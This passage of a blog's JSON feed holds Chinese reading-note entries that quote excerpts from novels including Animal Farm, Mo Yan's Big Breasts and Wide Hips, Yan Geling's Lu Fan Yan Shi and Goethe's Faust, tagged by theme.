href=\"#5-24\">#</a> 5-24</h3>\n<p>处在黑暗贫困中的贱民们则蜂拥而至，争着吃那些几乎遍地皆是的肉食；他们饿的发了狂，被迫饥不择食的吞噬分文不收的些许卑贱食物。</p>\n<p>就这样，我们把一位勇士变成了一头猛兽，关进一个不值钱的铁笼里，而他入内时则态度坚定，动作敏捷。</p>\n<p>尽管他应该感到死亡在即，然而并未忘记自己是干什么的，也并未忘记咱们的老传统，还在继续搏斗着，以躲避开刻耳伯洛斯的饕餮之日，他不停地以生命的代价扮演着自己所承担的角色，用巨大的身躯做出各种各样的动作，时而夺路而逃，时而张牙舞爪。</p>\n<p>我那写在天上的名字，遭到尘世间秽物的玷污！</p>\n<p>这种好奇心，将是亵渎神灵的！否则你将会从命运把你安排好的养尊处优中，落入最黑暗的煎熬中，并将永远失去我的怀抱。</p>\n<p>对她而言，当幸福不被人们知道的时候，那些幸福的人并不是幸福的。</p>\n<p>你是什么长相，对我来说已经无关紧要；漫漫长夜的黑暗也不再使我感到厌恶；我有你，你就是我的光明。</p>\n<p>她们用姐姐的虚伪名义和面孔的假意欢笑，掩盖住隐藏在心底的奸诈诡计，再用阿谀奉承的语言这般抚慰。</p>\n<p>人们的情趣，雅兴和含蓄已不复存在，取而代之的则到处是粗俗、下流和兽欲。就连夫妻间的恩爱，朋友间的和乐，母子间的感情，也都消失不见了；随之而来的尽是伤风败俗，以及对一切伦理关系的肆意践踏。</p>\n<p>必须与一个俗里俗气而又不修边幅的女人讲话，实在令我生厌；不过只要复仇的愿望能够得到满足，不管帮助来自何方，都是不应该拒之门外的。</p>\n<h3 id=\"5-25\"><a class=\"markdownIt-Anchor\" href=\"#5-25\">#</a> 5-25</h3>\n<p>我长期奔波有多么疲劳，但愿能得到片刻的休憩，恢复一下体力。</p>\n<p>像我这样被缠在一张不可解脱的罗网里，还能往什么地方迈脚呢？</p>\n<p>她的身体虽说还在，但感觉已荡然无存，以致在即使冒险也无出路的沉重打击下，连伤心落泪聊以自慰这点最起码的要求也无法得到。</p>\n<p>要知在那下面，怜悯为法律所剥夺。</p>\n<p>她还活着，必须屈居在一只动物的尸身里，腐烂散发着恶臭味，直往鼻孔里面钻，这个能把她熏死，长久不进食，饥肠辘辘，直至将她饿死。</p>\n<p>登峰造极的乃是，她竟以如此异样，几乎是混淆黑白的方式，来确定我们所享有的名声：坏人被正人君子子的声誉所美化；与之相反，正直无邪的人倒被加上罪名。</p>\n<p>然而，我既不能为自己的理由辩护，亦无法说出一句话来予以否认。</p>\n<p>与其说他们是被绳索捆绑着，倒不如说他仍然被酒束缚着。</p>\n<p>可到头来我还是不幸，因为付出如此辛苦的劳累，竟连我理应获得的食料也换取不到。</p>\n<p>他用一个绳套束住一把蒺藜，上面的青刺扎伤人时能造成感染，然后将他悬挂在我的尾巴上，这样我在行路时，蒺藜就会剧烈地晃动，而致命的青刺接着会给我带来巨大的创痛。</p>\n<p>面对我含羞的沉默，他又往这些凭空捏造的罪名中，加入另外一些更加危言耸听的指控，依此方式成功地煽动起边牧人们打算把我弄死的强烈情绪。</p>\n<p>棍子的打击对我也起不了多大的作用，因为挨打受气我早已习以为常。</p>\n<p>倘若我能够讲话，那我就要如实吐露真情。可是我所能做的一切，只是一声不吭地在心里暗自叫好，尽管这一惩罚姗姗来迟。</p>\n<p>按照他们的指控，被咬定是一名盗窃牲口和血腥杀人的罪犯，留待次日再送交法官，以便让他接受–这是他们说的–正义的惩罚。</p>\n<h3 id=\"5-26\"><a class=\"markdownIt-Anchor\" href=\"#5-26\">#</a> 5-26</h3>\n<p>残酷的爱情之火初起时是柔和的，他用温暖激愤人心，可是之后如果烧得久了，就会变得炽热，势不可挡的烈焰将能烧焦整个人体。</p>\n<p>她拒绝任何食物和任何照顾，让自己落入一种被人遗弃的惨境；同时，他把自己关在黑黑的屋子里，断绝了跟日光的一切关系。</p>\n<p>他等不及哀伤在哭泣中获得补偿，等不及处于癫狂状态的混乱头脑恢复平静，等不及痛苦随着时间的推移而厌倦地自行消失。</p>\n<p>在死气沉沉中没有安慰，对生活的乐趣无法体验，而只能像个虚无缥缈的幽灵一样，在地狱的黑暗和太阳的光明之间游来荡去。</p>\n<p>十分庆幸自己能被看管起来，因为待在那所牢笼里对我来说则意味着解救。</p>\n<p>对于这种地狱般的生活，我再也看不见会有什么时来运转的可能。唯有我的生性好奇，能给我带来一点点消遣。</p>\n<p>不被人知晓得事情，可以说等于没有发生过。</p>\n<p>按照一种世代沿用的习俗，将同样的内容的卡片投入一个青铜票箱，被告人的命运便会确定，任何变化都不在可能将其更改。</p>\n<p>为了讨好一个有钱人，她风风火火的跑回家，把整个毒药匣子都拿来了。</p>\n<p>即使当今的法官们无不贪赃枉法，皆属卑鄙小人，甚而就是法庭上的衣冠禽兽–或者说得透彻些，是身穿法袍的秃鹫–这有什么大惊小怪的呢？难道在原始社会时，偏袒就不会介入人与神共同介入的判断？</p>\n<p>我早已受够了罪，历够了险。消除掉这四足动物的可憎嘴脸吧，让我恢复本来面目，回复原先的那个鲁巧。</p>\n<p>无论你出身高贵，还是养尊处优以及受过教育，都未曾使你受益分毫，而青年时代的放荡不羁却把你沦为情欲的奴隶，你那不幸的好奇心却使你得到痛苦的报应。</p>\n<p>人生扑朔迷离，需要受到清规戒律的影响。</p>\n<h3 id=\"5-27\"><a class=\"markdownIt-Anchor\" href=\"#5-27\">#</a> 5-27</h3>\n<p>要知道，女神手中既有地狱的钥匙，又有救生赐恩的信物，其实他所惯于选择的那些人，皆已越过人生的界石。处在光明结束之地的门槛上，并且一贯能在心中信守庄严的宗教秘密。</p>\n<p>所以，我只谈世俗者能够理解之事，前提是他们不存在渎神之念。</p>\n<p>我艰难的生活在铁渣和锤子之间–进退维谷。不过即使如此，神明仍在激励着我，未让我打退堂鼓。</p>\n<p>我应当无所畏惧，继续在法庭上从事律师职业，博取名望，同时不必害怕市井小人们的流言蜚语，要知我以寒窗之苦换取的学识，会在那种环境中引起妒忌。</p>\n",
            "tags": [
                "命运",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/62%E3%80%8A%E5%8A%A8%E7%89%A9%E5%86%9C%E5%9C%BA%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/62%E3%80%8A%E5%8A%A8%E7%89%A9%E5%86%9C%E5%9C%BA%E3%80%8B%20%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/",
            "title": "《动物农场》 乔治·奥威尔",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>凡动物一律平等，但是有些动物比别的动物更加平等。</p>\n<h3 id=\"5-32\"><a class=\"markdownIt-Anchor\" href=\"#5-32\">#</a> 5-32</h3>\n<p>我们的生命是悲催的、劳苦的和短促的。我们生了下来，供给我们的食物仅仅能够维持我们的躯体里始终有一口气，我们当中那些活下来的，就被强迫干活，直到筋疲力竭；一旦我们的使用价值到了尽头，我们立马就会遭到骇人听闻的残酷屠杀。</p>\n<p>人类所有的习惯都是邪恶的。最最重要的是，动物不得欺压自己的同类。不分强弱、无论贤愚，我们都是兄弟。凡动物都不可杀别的动物。凡动物一律平等。</p>\n<p>你如此念念不忘的那些缎带，其实是当奴隶的标志。你难道不懂得，自由地价值要高于缎带吗？</p>\n<p>正是为了你们，我们才喝那些牛奶，吃那些苹果。</p>\n<p>那一年动物们自始至终像奴隶一般在干活。但他们干得舒心，他们舍得出力，不怕牺牲，清楚地意识到自己做的一切无不为了他们的福祉，也是为了他们同类及其后代的福祉，而不是为了一帮不劳而获、专事偷盗的人。</p>\n<p>动物们带着几分惊异的心情猛然想起，这是他们自己的农场，每一寸土地都是他们自己拥有的财产。此刻展现在他们眼前的正是大家心向往之的地方。然而这个农场在动物们眼中从来不像这样一片乐土。</p>\n<p>那副蓝图上将是一个摆脱了饥饿和鞭子的动物社会，大家一律平等，工作各尽所能，强者护卫弱者，就像在听少校演讲之夜紫苜蓿用她的前腿卫护一窝失恃的小鸭那样。可是，理想的动物社会没有盼到，而他们反倒落入了这样一个时代：谁也不敢说出自己的想法，动辄狂吠不止的恶犬到处横行，你不得不眼睁睁看着你的同志在招认了丑恶罪行后被撕成碎片。</p>\n<h3 id=\"5-33\"><a class=\"markdownIt-Anchor\" href=\"#5-33\">#</a> 5-33</h3>\n<p>他对任何地方的所有动物都怀着深深的爱，甚至而且尤其深爱其他农场至今仍生活在愚昧和被奴役状态下的不幸动物。农场每次取得什么成绩，好运无论临到谁的头上，都要归功于拿破仑，这已称为惯例。</p>\n<p>在拿破仑表面上与皮尔金顿关系似乎挺友好的整个时期内，拿破仑自始至终实际上是与弗雷德里克串通的，他们之间一直存在着一项不足为外人道的默契。</p>\n<p>片刻之前他们感到的恐惧和绝望，已淹没在由敌人可鄙可耻的行径所激起的狂怒之中。一声号召复仇的有力呐喊墓地响起，动物们无须等下进一步令下，全体一致发起冲锋，直接扑向敌人。</p>\n<p>这头驴子上下微微晃动他的长鼻口作点头状，似乎对其中的奥妙心知肚明，但他什么也不会说。</p>\n<p>他们知道，当前的生活十分艰苦，简直难以糊口，他们时常感到饥饿，时常感到寒冷，他们通常除了睡觉就是干活。不过往昔的日子更苦，这是毫无疑问的。他们乐于相信这样的说法。此外，在往昔的日子里他们是奴隶，而现在他们是自由的，这才是最根本的区别。</p>\n<p>如果说有这样那样的艰难困苦必须忍受的话，它们也被这样一个事实抵消掉了：现今的生活具有比过去较多的尊严。</p>\n<p>一般来说，动物们还是喜欢这类庆祝活动的。说到底他们乐意听这样的话：他们是自己真正的主人，他们干的活都是为了他们自己的福祉。</p>\n<p>他们现在的生活总是饿的要命，累的要死；而别处存在着一个比这好的世界，这有什么不对，有什么不应该？</p>\n<h3 id=\"5-34\"><a class=\"markdownIt-Anchor\" href=\"#5-34\">#</a> 5-34</h3>\n<p>他把全身肌肉蹦的紧而又紧，顶住巨石下滑的力量，那时除了咬紧牙关坚持到底的意志力，好像再也没有什么能够支持他站直了不趴下。</p>\n<p>在农场管理和组织方面有干不完的工作。这些工作有属于其他动物过于无知而理解不了的。例如，吱嘎告诉他们，猪不得不每天耗费大量劳动叫做” 档案 “、” 报告 “，” 议事录 “、” 备忘录 “的神秘事务上头。那都是大张大张的纸必须在上面密密麻麻的写上字，一旦这些纸写满了字，就会放到炉子里烧掉。这对农场的福祉也是至关重要的。</p>\n<p>迄今为止，猪也罢，狗也罢，都还没有用他们自己的劳动生产过任何食物，而他们的数量却非常之多，他们的胃口又始终非常之好。</p>\n<p>他们没有任何东西可以拿来同当前的生活做比较，因为他们没有任何参照的依据，除非以吱嘎的长长的一大串一大串数字为准，而这些数字一贯表明任何事物都是越来越好，越来越好。</p>\n<p>事情从来没有、也永远不会大大好于过去或大大不如过去 – 反正饥饿、辛苦和失望是生活的不变法则。</p>\n<p>他们的一生也许过得很苦，他们的希望并没有完全实现，但他们意识到自己跟别的动物不一样。如果他们吃不饱，那并非由于必须养活对他们实施暴政的人类；如果他们工作很辛苦，至少他们是为自己工作。</p>\n<p>尽管他们仍然慑于狗们的淫威，尽管经年累月养成的习惯就是不管发生什么事情都不抱怨，概不批评，尽管这一切并没有改变，但现在已到了这样的时刻，动物们可以置以上的一切于不顾，说出一两句表抗议的话了。但是，却没有人能发出反叛的声音。</p>\n<p>凡动物一律平等，但是有些动物比别的动物更加平等。</p>\n<p>不光操作规程是最现代的，而且工作纪律严明，到处井然有序，这些对于任何地方的农场主都堪称楷模。动物农场的低等动物比群内任何动物干的活更多，而消耗的饲料却更少。</p>\n<h3 id=\"5-35\"><a class=\"markdownIt-Anchor\" href=\"#5-35\">#</a> 5-35</h3>\n<p>你们有你们的低等动物需要对付，我们有我们的下层阶级需要摆平。</p>\n<p>动物们从窗外朝里望，目光从猪移到人，再从人移到猪，又重新由猪移到人，要分清哪张脸是猪的，哪张脸是人的，已经不可能了。</p>\n<p>在这样一个社会里统治者像任何统治阶级一样都不愿意放弃权力。</p>\n<p>他们习惯于公共生活的比较自由和节制的环境，极权主义是他们完全不能了解的。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/65%E3%80%8A%E4%B8%B0%E4%B9%B3%E8%82%A5%E8%87%80%E3%80%8B%E8%8E%AB%E8%A8%80/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/65%E3%80%8A%E4%B8%B0%E4%B9%B3%E8%82%A5%E8%87%80%E3%80%8B%E8%8E%AB%E8%A8%80/",
            "title": "《丰乳肥臀》莫言",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>天堂和地狱之间都没给我留席位，我的席位在天堂和地狱之间，到头来，你会跟我一样。</p>\n<h3 id=\"5-42\"><a class=\"markdownIt-Anchor\" href=\"#5-42\">#</a> 5-42</h3>\n<p>好多人走出家门，像忙忙碌碌又像无所事事的蚂蚁。有的走，有的跑，有的站着不动。有的往东，有的往西，有的在原地转圈，东张西望。</p>\n<p>他的脸上，除了能表现出愚蠢笑容外，还能表现出深不可测的沉思默想，表现出化石般的荒凉，表现出麻木的哀痛。</p>\n<p>在最危急的关头，这个平日里总是招人厌烦的人，脱下自己的皮袄点燃，用火光和呐喊，把我们的理智唤醒。</p>\n<p>活着的人和死去的人，我们知道的故事和我们不知道的故事，源源不断地从母亲嘴里吐出来，在我们眼前晃动着，演绎着，表演着，变换着。</p>\n<p>我的双手白嫩细腻，我的礼服一尘不染，我的头发金光灿灿。我的肠胃从没消化过动物的尸首，我的牙齿从没咀嚼过植物的纤维。</p>\n<p>天堂和地狱之间都没给我留席位，我的席位在天堂和地狱之间，到头来，你会跟我一样。</p>\n<p>你说这亲戚，听起来怪神圣的，可仔细一想，所谓亲戚，都建立在男人和女人睡觉的关系上。</p>\n<p>为什么秦二不敢惩治司马库？因为司马库家有钱，司马库家里的钱是哪来的？他不种麦子吃白馍，他不养家蚕吃绫罗，他不酿酒天天醉，乡亲们，是我们的血汗养活了这些地主老财。</p>\n<p>我们前后左右，都是逃难的人。许多熟悉的脸和不熟悉的脸都变得乌七八糟。大家都很艰难，人艰难，鸟艰难，驴艰难，比较舒服的，是老太太怀里的母鸡，和我的奶羊。</p>\n<h3 id=\"5-43\"><a class=\"markdownIt-Anchor\" href=\"#5-43\">#</a> 5-43</h3>\n<p>一根黑色的炮管从一堆乱砖头中孤傲的伸出去，直指向已有寒星颤抖的黄昏的天空。村子里一片死寂，我们一家，像行走在传说中的地狱里。</p>\n<p>你只能用眼睛看，用鼻子嗅，用手触摸，用心思体会揣摩，但是不能说话。至于说话究竟会带来什么样的后果，没有人问，也没有人会说，仿佛大家都知道，大家都心照不宣。</p>\n<p>结婚的真正意义，司马亭就要公开地和母亲睡在一个被我了，母亲肥大的乳房就要被司马亭占有了。</p>\n<p>央求来的是密集的纸条抽打。我几次嚎哭，但招来的是魏羊角的威胁。我唯一地选择便是不出声的，忍受他们的打击，走向他们要我去的地方。</p>\n<p>他们要讨论我的前途和命运时，我竟然像一个无关紧要的旁听者一样，没有恐怖，也没想到逃跑。我沉浸在一种迷醉的状态中。</p>\n<p>我们挣扎着，哭嚎着，除了拖延了一些时间之外，但最终的结果还是被反剪着胳膊，高高的吊在司马库粗大牢固的松木梁上。</p>\n<p>这十几年里，上官家的人，像韭菜一样，一茬茬的死，一茬茬的生，有生就有死，死容易，活难，越难越要活。越不怕死越要挣扎着活。我要看到我的后代儿孙浮上水来那一天，你们都要给我争气。</p>\n<p>往事都以碎片的形式出现，他无法完整的回忆起一件事，包括一个人的脸。一切都像浮在动荡不安的水面上，瞬息万变，难以捕捉。</p>\n<p>政治可以翻云覆雨，可以朝秦慕楚，可以把白的说成黑的，黑的说成白的。</p>\n<p>乔其纱在每天一两粮食的时代里既不相信政治，也不相信科学，她凭着动物的本能追逐着馒头，以至于举着馒头的是谁已经毫无意义。</p>\n<h3 id=\"5-44\"><a class=\"markdownIt-Anchor\" href=\"#5-44\">#</a> 5-44</h3>\n<p>逝去的岁月，就像一条被浓雾遮住的通往草原深处的小路，只能模糊的看回去三、五米，再往里就是那弥漫的雾气了。大半辈子过去了，而且，过的非常糟糕，非常龌龊，连自己都感到可怜，恶心。</p>\n<p>接着他又一次想起了自己的年龄，他浸泡在迟暮的感觉里，那怅惘的、伟大的空旷感无限的展开了。他觉得自己就像一株在碱土荒原上枯萎了的茅草，悄悄地生，悄悄地长，现在正在悄悄的死去。</p>\n<p>他远远的就看到了，一个白发苍苍的老人，手扶着一根用旧伞柄改成的拐杖，站在塔前，向这边张望着。他感到双腿沉的几乎拖不动了，泪水不可遏制的往外涌。母亲的白发与塔上的枯草一样，猛然间也变成了燃烧的火苗子。</p>\n<p>他深深地自责着，自怨着，自艾着，自己原谅自己，自己心痛自己，自己开导自己，自己说服自己，自己教育自己，不知不觉地，他又站在了 “东方鸟类中心” 大门口了。</p>\n<p>在沉默的街道上，他感到任何人之间反倒拆除了隔阂的篱笆。至高无上的，是有意识地克制自己，让嘴巴变成一种不招惹是非、功能单一的器官。</p>\n<p>在地狱里生活一辈子的人并不特别感到地狱的痛苦，只有那些在天堂里生活过的人，才能真切体会到地狱的痛苦。他感到自己现在已落在地狱的最底层，倒霉到了极点。</p>\n<p>大栏市人现在正处在最文明也最野蛮的阶段，有的人坐本茨，有的人骑毛驴。有的人吃孔雀，有的人喝稀粥。</p>\n<p>看看公有的财产是怎么样进入个人的腰包，看看他们怎么样挥霍人民的血汗，看看吧，他们一件乳罩够我们吃半年，他们一顿便饭，是我们仨月的粮。到处都是饭店酒楼，到处都是贪污受贿，到处都是营私舞弊。</p>\n<p>我没有精神病，我的头脑太清楚了，清楚地连我自己都感到害怕。我知道，我无法冲破他们用金钱和生殖器编织成的天罗地网，我的下场将像疯狗一样凄惨，今天我还在这里演讲，明天我就可能死在垃圾场。</p>\n<h3 id=\"5-45\"><a class=\"markdownIt-Anchor\" href=\"#5-45\">#</a> 5-45</h3>\n<p>去年因为我怕她独自一人夜游街头，今年才有我独自一人夜游。养虎贻患，不应该可怜那些冻僵了的蛇，处处都有陷阱。我从一个陷阱爬上来，随即便是蹦进另一个陷阱，一个更比一个深。</p>\n<p>这世界上，好多堂堂皇皇的事，都是在黑灯瞎火里干出来的。</p>\n<p>上官寿喜，很难说他是个人，他在外窝囊得像鼻涕一样，在他娘面前也是唯唯诺诺，可是对待老婆，却凶狠的要命。</p>\n<p>人活一世就是这么回事，我要做贞洁烈妇，就要挨打、受骂，被休回家；我要偷人借种，反倒成了正人君子。</p>\n<p>八姐顺着我家那条现在早已当然无存的胡同，断断续续的往北走，多少往事涌上了你的心头，你是不睁眼看破了世上风情，人们都说盲目人心如明镜。你二十年里沉默寡言，心中长存着愧疚。</p>\n<p>母亲从磨顶上抓了几把黄豆，直着脖子吞了下去，然后一低头，哗啦啦呕出来。母亲呕完粮食后满眼是泪，说：“我本想救我的孩子，谁知道反把她逼上了死路。”</p>\n<p>她想爬起来，但吃惊的感觉到，身体已经不听指挥，所有的都僵硬了，只有心活着，心痛欲烈。天地间一片死寂，水珠落地的拍哒声和河水呼隆呼隆的声音震耳欲聋。</p>\n<p>四顾远望，上官金童心中怅然，不知何去何从。他看到张牙舞爪的大烂市正像个恶性肿瘤一样迅速扩张着，一栋栋霸道蛮横的建筑物疯狂地吞噬着村庄和耕地。</p>\n<h3 id=\"5-46\"><a class=\"markdownIt-Anchor\" href=\"#5-46\">#</a> 5-46</h3>\n<p>政府，政府 — 这里人习惯把政府工作人员和所有拿工资吃国库粮的人尊称政府，几十年如一日 ---- 您这不是为难我吗？即使我把母亲烧了，那骨灰不还是要埋在地下吗？这地方远离市区，不长庄稼，埋上个死人，几年后不就变成泥土了吗？你让我趴出来，趴出来怎么办？</p>\n<p>花瓣很脆，宛如生虾肉，咀嚼几下便是满嘴血腥味。花朵为什么会有血腥味呢？因为大地渗透了人类的鲜血。</p>\n",
            "tags": [
                "社会",
                "历史",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/66%E3%80%8A%E9%99%86%E7%8A%AF%E7%84%89%E8%AF%86%E3%80%8B%E4%B8%A5%E6%AD%8C%E5%B2%91/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/66%E3%80%8A%E9%99%86%E7%8A%AF%E7%84%89%E8%AF%86%E3%80%8B%E4%B8%A5%E6%AD%8C%E5%B2%91/",
            "title": "《陆犯焉识》严歌岑",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>她宁可篡改记忆，最终把记忆变成事实。</p>\n<h3 id=\"5-46\"><a class=\"markdownIt-Anchor\" href=\"#5-46\">#</a> 5-46</h3>\n<p>老几不反应，他对待肮脏就是不反应。肮脏的念头、肮脏的言语不干扰他，就是因为他对它们可以聋，也可以瞎。</p>\n<p>他感觉五官变得僵硬笨拙，一个笑容都要把在场的三个人累死。</p>\n<p>女人的可怜让他这样的男子没出息，为她们常年神伤，只要她们需要，他就把自己的前程、幸福、自由拱手交出，供她们去消耗、糟蹋。</p>\n<p>你要想看不见谁，你可以在谁面前瞪大眼睛做睁眼瞎。这是他惯用的技俩，他用这样的微笑把自己关闭起来。</p>\n<p>他总是一再谢绝。他知道自己无法让大卫明白，他所剩的自由不多，决不能轻易地再交一部分给某个组织。</p>\n<p>因为他知道没有共同的未来等在望达和自己的前面，他反而天真无畏，珍爱两人相聚的每一天。相聚一天，他就优美奢华地好好葬送那一天。</p>\n<p>原来在他这里，恋爱是一回事，和谁去熬完一生是另一回事。与之去熬完一生的女人，必定引起他的无限怜悯。</p>\n<p>在此地谁有块心病，有块暗伤，一定会有人来揭它戳它，你的痛不欲生可以舒缓大家的痛不欲生，一份不幸给大家拿去，医治集体的不幸。</p>\n<p>梁葫芦心目中，人不会白白的好，人必然是为了一个目的去好，好一次就要完成一个任务，或堵住一个漏洞。世界这么大就是没给他一份纯粹、无贪图的好。</p>\n<p>大卫在美国花了时间，从一门课跳到另一门课，什么都学一半，又都丢下，最后去了欧洲，要去找人生的终极意义。</p>\n<h3 id=\"5-47\"><a class=\"markdownIt-Anchor\" href=\"#5-47\">#</a> 5-47</h3>\n<p>哪里没有无耻？帮着大卫无耻一回，还让无耻行了好，施了善。无耻能给大卫的孩子付出牛奶账，那可是积德的无耻。</p>\n<p>一代代的小说家戏剧家苦苦地写了那么多，就是让我们人能了解自己，而我们人还是这么不了解自己。一定要倾国倾城，一定要来一场灭顶之灾，一场无期流放才能了解自己，知道自己曾经是爱的。</p>\n<p>在美国，在上海他都不入伙，宁可吃不入伙的亏，兜着不入伙的后果，现在会入这些乌合之众的伙吗？不识抬举就不识抬举吧，老几还剩下什么？就心里最后那点自由了。</p>\n<p>有时候真不好熬。就要熬不过去了，一气之下就想自杀了拉倒了。不过又一想，再熬熬看，反正总可以晚一点杀自己的。有自杀垫底，什么都好熬了。</p>\n<p>寂寞和痛苦在她这里从来都会变成别的东西，变成刁钻、刻薄，变成此刻这样的酸溜溜。</p>\n<p>从他记事开始，他就为了不让别人为难，常常做别人为难他做的事，做别人要他做的人。他做了别人要他做的人，他是满足的。这满足似乎抵消了他因为扮演自己而引起的内心紧张，这满足也似乎补偿了他那” 与世无争 “带来的真正失去。</p>\n<p>他把她的纯洁外壳剥去，放在竹席子上，要他把她当个器皿，只用来盛满他的欲望。他大概是病了，一面把她当垃圾，一面用尽手段在和她的同居人竞争。妒忌的男人原来是这么低级，一切争斗痛苦只为一份肉能独属于自己。</p>\n<p>大学学生的思想本来就极不卫生，一旦有自由、民主的蛊惑马上感染成病。</p>\n<p>但是战争把人都打坏了。人心越来越坏，越来越不如禽兽，衙门里没有不贪污不腐败的人，无耻成了一种正常品行。</p>\n<p>老几觉得自己身体和形状被灌注在黑暗里，就像一个琥珀，一旦被取出，人们会看见一个丑陋的老人琥珀。再过一阵，他又觉得黑暗灌进了自己，灌进血管和肌肉，灌进了五脏六腑。</p>\n<h3 id=\"5-48\"><a class=\"markdownIt-Anchor\" href=\"#5-48\">#</a> 5-48</h3>\n<p>他盲写的句子和段子落在无限的黑暗里，黑暗可以无止境吸收他盲写的成果，无论他写出多少，立刻填进了无底的黑暗，立刻被黑暗消化。</p>\n<p>除了一身的污垢，以及一身从难民那里来的虱子，他几乎一无所有。</p>\n<p>他很抵触这一行为，但到最后，他不得不为了如此世俗、现实的目的送礼。</p>\n<p>他厌恶那种强塞给他的主宰，那个传统，那个方式。</p>\n<p>一道指示给一级级贯彻下去，就贯彻成另一桩事了。因为每一级都要把自己的私怨，阴暗加进去。但他没什么可抱怨的。</p>\n<p>二十岁一个中国男人，应该可以不动声色地防御，甚至进攻，不露痕迹地交换利益甚至勾当，只要不被抓住永远不算作弊。二十岁，他应该习惯了人的那种淡淡的无耻，把它当成是正常的人味。</p>\n<p>灵魂看着自己的肉体自行其是，无法去控制它。经历了巨大心理恐惧的人以这种方式逃避了恐惧。那暂时失去灵魂的肉体是自由的，可以不顾约束和禁锢，连铁撩都失去了重量。</p>\n<p>梦游者们的理解力和语言似乎跟着看守隔着许多生物代，都不懂他叫喊的是什么，仍然以他们失重的步子走他们的老路。</p>\n<p>他以为自己是爱自己的，现在他才知道自己最怕自由。一有了自由，他就要考虑，婉喻还会不会接受自己，凭什么还要接受自己，自己的价值在哪里。</p>\n<p>在没有自由的监号里想曾经的” 没自由 “，才意识到那” 没自由 “是多么自由。</p>\n<p>偶然碰到对他好的人，他觉得很烦，首先弄不清对方这份” 好 “到底有什么图头，要花许多精神去猜度分析，再说，对方对你好，你还得以好还好，一来一去，二来二去…… 多么麻烦！</p>\n<p>她宁可篡改记忆，最终把记忆变成事实。</p>\n<p>冯子烨从不愿给孩子们做个才智学识过人的父亲，而是给他们做一个世俗的大众化的父亲，因为这样的父亲安全，容易让大众认可，他给予儿女们的父爱也才安全，源源不断，不会被某个政治运动截断或剥夺。</p>\n<h3 id=\"5-49\"><a class=\"markdownIt-Anchor\" href=\"#5-49\">#</a> 5-49</h3>\n<p>这个主义里的人为许多目的做好事，就是不为自己的目的。</p>\n<p>她冥冥中等待的似乎比那些都重要，重要得多，可她一点也不知道等的是什么。等来了，又总会来一声暗自叹息：不过如此。</p>\n<p>他的失眠越来越彻底，脱衣上传闭眼只是尊重人类这个习性而已。也是为了对他自己有个交代：睡不睡是态度问题，能否睡得着是水平问题。</p>\n<p>等待某件事发生是难熬的、耗人的，对于好事坏事的等待都是牢，都会剥夺一部分属于你自己的自由。</p>\n<p>他们从来不懂，他们的本事孤立起来很少派得上用场，本事被榨干，也没人会饶过他们，不知如何自身已陷入一堆卑琐，已经参与了勾结和纷争，失去了他们最着重的独立自由。</p>\n<p>最后他又回到了这里，他意识到，在这无垠的大荒漠里，存在着真正的自由。</p>\n",
            "tags": [
                "命运",
                "历史",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/58%E3%80%8A%E6%B5%AE%E5%A3%AB%E5%BE%B7%E3%80%8B%E6%AD%8C%E5%BE%B7/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/58%E3%80%8A%E6%B5%AE%E5%A3%AB%E5%BE%B7%E3%80%8B%E6%AD%8C%E5%BE%B7/",
            "title": "《浮士德》歌德",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我心深处，盘踞着两种精神，一个是强烈的风尘的爱欲，一个是超尘崇高的灵境追求。</p>\n<h3 id=\"5-13\"><a class=\"markdownIt-Anchor\" href=\"#5-13\">#</a> 5-13</h3>\n<p>我每天都看见人们在痛苦中遭受煎熬，他们并没有多大进步，还像远古时一样的野蛮。造成这一切的原因是上帝让人拥有了理性。有了理性后，人类变得自私、残暴。如果没有理性，人们完全可以比这生活地更好。</p>\n<p>尘世的事情他不上心，却总是野心勃勃的盯着远方。</p>\n<p>他的沉思便是他的痛苦，他的微笑便是他永远的孤独。烦闷的心被莫名的痛苦占据着，停息了生命的活力。</p>\n<p>灵界并未关闭，只是你的官能阻塞，心灵已死。</p>\n<p>只有用发自内心的真情，才能打动你的听众。否则你一无所获，你只能东拼西凑的炒冷饭，糊弄小孩或猴子。</p>\n<p>你尽量去追求浮华的雄辩，要说的就直接说出来，用不着咬文嚼字。否则，哪怕你说得天花乱坠，听起来也一样味同嚼蜡。</p>\n<p>不幸常常发生，世人一见到所谓学者就立即躲开，因为他们的著作不过是垃圾、破烂，充其量也不过是演绎封建主义的。</p>\n<p>从前倒是有几个清醒看世界的人，正因为清醒地认识了，所以在这个世界备受摧残。</p>\n<p>人们陶醉在自己的小天地中，忧愁将潜入心底，它不安地动荡，扰乱平静的幸福。或者戴上假面具，扮演家庭、夫妻、儿女，扮演水、火及毒剂，人们为此对这些世道而终日惶恐不安。</p>\n<p>破旧的书籍堆成高墙，禁锢着浮士德，还有数不清的破烂，这一切的一切，怎能不压抑他的思想呢？在这样的世界里，如何能寻找到缺少的东西？</p>\n<h3 id=\"5-14\"><a class=\"markdownIt-Anchor\" href=\"#5-14\">#</a> 